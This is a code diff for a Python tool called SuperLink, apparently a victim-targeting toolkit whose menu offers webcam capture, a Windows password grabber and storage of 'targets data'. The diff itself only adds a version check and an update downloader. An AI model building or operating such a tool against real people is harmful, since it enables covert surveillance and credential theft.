@@ -3,7 +3,7 @@ from os import getcwd, getlogin, listdir, name, stat, system
 from pathlib import Path
 from platform import uname
 from subprocess import Popen
-from sys import exit
+from sys import exit, version
 from time import sleep
 
 from colorama import Fore, init
@@ -13,6 +13,7 @@ from Modules.checkConfig import CheckConfigFile
 from Modules.checkUpdates import CheckUpdates
 from Modules.clearData import DeleteFilesAndDirs
 from Modules.data2image import Data2Image
+from Modules.downloadUpdate import GetNewUpdate
 from Modules.editIndexFile import EditIndexFile
 from Modules.geoip import GeolocationIP
 from Modules.loadTemplates import loadTemplatePath
@@ -31,24 +32,33 @@ if name == "nt":
     try:
         from win10toast import ToastNotifier
     except ModuleNotFoundError:
-        print(
-            LR + " [!] 'win10toast' is not installed! | Installation: pip install win10toast==0.9")
+        print(LR + " [!] 'win10toast' is not installed! " + 
+              LW + "| " + LR + "Installation: pip install win10toast==0.9")
         exit()
     try:
         import neofetch_win
     except ModuleNotFoundError:
-        print(
-            LR + " [!] 'neofetch-win' is not installed! | Installation: pip install neofetch-win==1.1.5.1")
+        print(LR + " [!] 'neofetch-win' is not installed! " + 
+              LW + "| " + LR + "Installation: pip install neofetch-win==1.1.5.1")
         exit()
 else:
     pass
 
 
 def banner():
-    script_title = "SuperLink - V1.0 - By IHosseini"
+    script_title = "SuperLink - v1.1 - By IHosseini"
     TMsettitle(script_title)
     TMcleaner()
     neofetch()
+
+
+def check_py_version():
+    py_version = version.split(" ")[0].replace(".", "")
+    if int(py_version) < 380:
+        print("\n\n" + LR + " [!] This script requires Python version 3.8+ to run!")
+        exit()
+    else:
+        pass
 
 
 def win10notif(
@@ -68,6 +78,7 @@ def win10notif(
         else:
             notify = ToastNotifier()
             notify.show_toast(title, msg, icon, duration, threaded)
+
 
 def neofetch():
     system("neofetch -c green -ac red" if name == "nt" else "neofetch")
@@ -155,11 +166,13 @@ def home_options():
     sleep(0.1)
     print(LG + " [" + LR + "04" + LG + "]" + LB + " Webcam access & take a picture")
     sleep(0.1)
-    print(LG + " [" + LR + "05" + LG + "]" + LB + " Password grabber (only Win10)")
+    print(LG + " [" + LR + "05" + LG + "]" + LB + " OS password grabber (only Win10)")
     sleep(0.1)
     print(LG + " [" + LR + "06" + LG + "]" + LB + " Show all targets data files")
     sleep(0.1)
-    print(LG + " [" + LR + "07" + LG + "]" + LB + " Wipe out all previous targets data (IMG & TXT)\n")
+    print(LG + " [" + LR + "07" + LG + "]" + LB + " Wipe out all previous targets data (IMG & TXT)")
+    sleep(0.1)
+    print(LG + " [" + LR + "08" + LG + "]" + LB + " Check for available updates!\n")
     sleep(0.1)
     print(LG + " [" + LR + "99" + LG + "]" + LY + " Quit :(\n")
     sleep(0.1)
@@ -171,20 +184,7 @@ def start():
     cwd = cwdir()
     _del_ = DeleteFilesAndDirs()
     tprint = TMprint()
-    updater = CheckUpdates()
-    print("\n\n")
-    tprint.out(LG + " [>] Checking for new update...")
-    sleep(1)
-    if updater.checkForUpdates is False:
-        tprint.out(LG + " [>] Everything is up-to-date!")
-        sleep(3)
-    elif updater.checkForUpdates is None:
-        tprint.out(LY + " [!] Something went wrong!!!")
-        sleep(3)
-    else:
-        tprint.out(LG + f" [!] There is a new update available! (Version" +
-                   LR + f"{updater.checkForUpdates}" + LG + ")")
-        sleep(5)
+    check_updates()
     while True:
         try:
             init()
@@ -233,6 +233,8 @@ def start():
                            icon=icons_path + "trash_empty.ico")
                 press_enter()
                 continue
+            elif opt == "08":
+                check_updates()
             elif opt == "99":
                 TMcleaner()
                 break
@@ -247,6 +249,42 @@ def start():
         except KeyboardInterrupt:
             TMcleaner()
             break
+
+
+def check_updates():
+    tprint = TMprint()
+    updater = CheckUpdates()
+    up_downloader = GetNewUpdate()
+    banner()
+    print("\n\n")
+    tprint.out(LG + " [>] Checking for new update...")
+    if updater.checkForUpdates is False:
+        tprint.out(LG + " [>] Everything is up-to-date!")
+        sleep(3)
+    elif updater.checkForUpdates is None:
+        tprint.out(LY + " [!] Something went wrong!!!")
+        sleep(3)
+    else:
+        tprint.out(LY + f" [!] There is a new update available! (" +
+                   LR + f"v{updater.checkForUpdates}" + LY+ ")")
+        up_file = f"SuperLink-v{updater.checkForUpdates}"
+        select_down = input("\n\n" + LG + " [" + LR + "?" + LG + "]" + 
+                            LB + f" Do you want to download the new version ({updater.checkForUpdates}) ? [y/n] " + 
+                            LW + "").lower()
+        if select_down == "y" or select_down == "yes":
+            banner()
+            print("\n\n")
+            tprint.out(LG + f" [>] Downloading new version ({updater.checkForUpdates}) ...")
+            up_downloader.download(up_file)
+            tprint.out(LG + f" [>] Downloaded successfully!")
+            sleep(3)
+            tprint.out(LG + f" [>] Extracting new update zip file ({up_file})...")
+            up_downloader.extract(up_file, path=f"../{up_file}")
+            tprint.out(LG + f" [>] Update zip file successfully extractrd in " + 
+                       LW + f"[../{up_file}]")
+            sleep(4)
+        else:
+            pass
 
 
 class TMprint:
@@ -500,4 +538,5 @@ def implement_userdata(info_data: dict, ip_data: dict):
 
 
 if __name__ == "__main__":
+    check_py_version()
     start()
